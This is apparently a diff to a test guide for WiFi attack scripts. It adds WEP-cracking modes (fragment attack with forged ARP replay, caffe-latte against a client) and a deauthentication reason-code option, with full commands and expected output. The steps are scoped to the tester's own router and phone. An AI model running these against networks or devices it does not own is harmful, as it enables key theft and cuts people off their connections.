@@ -56,7 +56,8 @@ sudo ./scripts/wep-crack.sh -i wlp2s0 -b 11:22:33:44:55:66 -c 6 -m active -o cap
 | `-b` | Target AP BSSID | *(required)* |
 | `-c` | Channel the AP is on | *(required)* |
 | `-e` | AP ESSID (helps fake-auth on some APs) | *(none)* |
-| `-m` | `active` or `passive` | `active` |
+| `-m` | `active`, `passive`, `forge` (a forged ARP request, section 12.11) or `caffe` (caffe-latte against the client in `-C`, section 12.12) | `active` |
+| `-C` | Client MAC for `-m caffe`: one device connected to the AP, such as your phone on GL. Required for caffe, refused by the other modes. That client may be deauthenticated | *(none)* |
 | `-o` | Output prefix; the files go to a new folder under `logs/` | `wepcap` |
 | `-t` | IVs gained before `aircrack-ng` runs again (first try at 40000) | `10000` |
 
@@ -230,6 +231,7 @@ sudo ./scripts/competition-deauth.sh -i wlp2s0 -b <BSSID> -c <CHANNEL> -u <HH:MM
   makes one call to the broadcast address, which reaches every client.
 - `-x logs/own-devices.txt` is optional, and replaces `-f`: each round targets every other client that the run's capture lists on the AP, minus the MACs in that file. Nothing is broadcast, and a round with no other client is skipped (section 12.10).
 - `-r N` is optional: stop after N rounds (a short test). Without it, the run goes until `-u` or Ctrl-C.
+- `--deauth-rc N` is optional: the reason code of each deauthentication frame, 0 to 254. Without it, aireplay-ng uses 7 (section 12.13).
 - You type `START` at the prompt. Ctrl-C stops the run and restores WiFi.
 - Each round sends 5 frames per target and then waits 2 s. A call still running after 30 s is stopped.
 
@@ -409,3 +411,66 @@ Expect `[!] wlp2s0mon reports channel '6', not 11. Nothing was changed.` for the
    ```
    Expect `N address(es) are left out of every round, listed in logs/<run>/excluded.txt.`, then one line per round: `round 1: no other client of <GL BSSID> in the capture yet`. Your addresses never appear in a round line, and nothing is sent while no other client is on the router.
 5. The same, with one other device on the GL router that is not in `own-devices.txt` (a spare phone, switched on). **This sends frames to that device only.** Expect `round N: 1 other client(s): <its MAC>`, then `round N <its MAC>: ...` lines, and no line for your own addresses.
+
+### 12.11 Forged ARP request, mode forge (sends frames)
+
+Use this when the network sends no ARP request of its own, so active mode has nothing to copy. Run it on the GL router only. The fragment attack needs a data packet from the AP, and a download on a client gives one, so start the download first (section 9).
+
+1. Terminal 1: start the download on the phone (section 9), and leave it running. The laptop must reach the router by its LAN cable: the crack takes wlp2s0 out of Wi-Fi, so the download server has to run on the cable address.
+2. Terminal 2: the forge run. **This sends frames** to the GL router: fake auth, fragments and forged ARP requests.
+   ```bash
+   sudo ./scripts/wep-crack.sh -i wlp2s0 -b <GL BSSID> -c 6 -m forge -o forge_test
+   ```
+   Expect, in order: `[*] Associating with AP (fake auth)...`, `[*] Target answered x/y probes.`, `[*] Fragment attack: waiting up to 120 s for a data packet from <GL BSSID>...`, `[*] Keystream saved to .../fragment-....xor`, `[*] ARP request forged from the keystream: .../forged-arp.cap`, `[*] Replaying the forged ARP request to pump IVs...`, then lines with `IVs` that rise, and `TX` counts. The fragment step prints nothing until it finishes, so it can take a while. If you see `Falling back to PASSIVE capture`, the injection test failed and nothing was forged. If `FW resets` climbs, the card is resetting under the replay (the 3168 did this on 21 Oct), and the run ends with `is gone`.
+3. Terminal 3: the two logs, in the run folder that terminal 2 printed (`logs/<run folder>`):
+   ```bash
+   grep -a "Saving keystream" logs/<run folder>/forge_test-fragment.txt
+   grep -a "Wrote packet" logs/<run folder>/forge_test-forge.txt
+   ```
+   Expect one line from each. If the first is missing, the fragment attack found no usable packet. Read `forge_test-fragment.txt`, and run again during a download. Ctrl-C in terminal 2 stops the run.
+
+### 12.12 Caffe-latte against one client, mode caffe (sends frames)
+
+Caffe-latte works from one connected client, and the aireplay-ng man page says it needs no AP traffic. This flow is not verified on this machine: the attack may deauthenticate that client, so the phone can drop and reconnect. Run it on the GL router only, with your phone as `-C`.
+
+First, the refusals. They stop before the card is touched, and no run folder is made:
+
+```bash
+sudo ./scripts/wep-crack.sh -i wlp2s0 -b <GL BSSID> -c 6 -m caffe
+sudo ./scripts/wep-crack.sh -i wlp2s0 -b <GL BSSID> -c 6 -m forge -C 11:22:33:44:55:66
+```
+
+Expect `[!] -m caffe needs -C <client MAC>: ...` for the first, and `[!] -C is only used by -m caffe.` for the second.
+
+1. Connect the phone to the GL router, and find its address on the router as in 12.4.
+2. The run. **This sends frames to the phone, and may deauthenticate it.**
+   ```bash
+   sudo ./scripts/wep-crack.sh -i wlp2s0 -b <GL BSSID> -c 6 -m caffe -C <phone MAC> -o caffe_test
+   ```
+   Expect `[*] Associating with AP (fake auth)...`, `[*] Target answered x/y probes.`, `[*] Caffe-latte against client <phone MAC>: it may deauthenticate that client, so it can drop and reconnect.`, then lines with `IVs`.
+3. If the run ends at once with `Replay stopped; see .../caffe_test-replay.txt`, read that file. An error such as `Please specify ...` means the flags need a change, and that line is what to send back. Ctrl-C stops a run that works.
+
+### 12.13 Deauth reason code (dry run, then sends frames)
+
+The reason code is the number that aireplay-ng puts in each deauthentication frame. Without `--deauth-rc`, it is 7. The dry run shows the code and sends nothing.
+
+1. The plan with a code, and no frames:
+   ```bash
+   ./scripts/competition-deauth.sh -b <GL BSSID> -c 6 -x logs/own-devices.txt --dry-run --deauth-rc 3
+   ```
+   Expect `[*] Deauthentication reason code 3 (aireplay-ng --deauth-rc). Without the option, aireplay-ng uses 7.` and `Dry run: nothing was sent`.
+2. A code out of range is refused before the plan:
+   ```bash
+   ./scripts/competition-deauth.sh -b <GL BSSID> -c 6 -x logs/own-devices.txt --dry-run --deauth-rc 300
+   ```
+   Expect `[!] --deauth-rc must be a number from 0 to 254, such as 3. The default is 7.` and no plan.
+3. Live, with your phone as the only target. **This sends frames to your phone.** Terminal 1 keeps the monitor up on channel 6, so the station table shows the phone:
+   ```bash
+   sudo ./scripts/airodump.sh -i wlp2s0 -c 6
+   ```
+   Terminal 2 runs the rounds on that monitor, as in 12.7. Type `START` at each prompt. Run the first line with code 3, then the second without the option:
+   ```bash
+   sudo ./scripts/competition-deauth.sh -M wlp2s0mon -b <GL BSSID> -c 6 -f my-phone.txt -r 1 --in-window --deauth-rc 3
+   sudo ./scripts/competition-deauth.sh -M wlp2s0mon -b <GL BSSID> -c 6 -f my-phone.txt -r 1 --in-window
+   ```
+   Expect the plan line from step 1 in the first run, and `reason 3` in the first line of its `deauth.log`. The second run's log says `reason default 7`. In terminal 1, note roughly how long the phone's row is missing before it returns. That is a look by eye, so one pair of runs shows little. Ctrl-C in terminal 1 at the end restores WiFi.
